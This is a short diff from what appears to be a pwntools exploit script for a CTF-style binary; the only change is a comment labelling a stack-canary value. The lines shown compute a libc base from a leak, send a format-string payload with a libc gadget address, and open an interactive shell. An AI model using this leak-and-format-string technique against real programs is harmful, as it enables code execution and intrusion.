@@ -23,7 +23,7 @@ libc = int(p.recvuntil(".")[:-1]) - 0x1e4ca0
 print hex(libc)
 
 p.sendlineafter("?","q")
-p.sendafter("?",p64(libc+0x1ec569)[:-1])
+p.sendafter("?",p64(libc+0x1ec569)[:-1]) #canary
 p.sendafter("?","%1031c%c%c%13$.7s%8d"+p64(libc+0x106ef8))
 
 p.interactive()
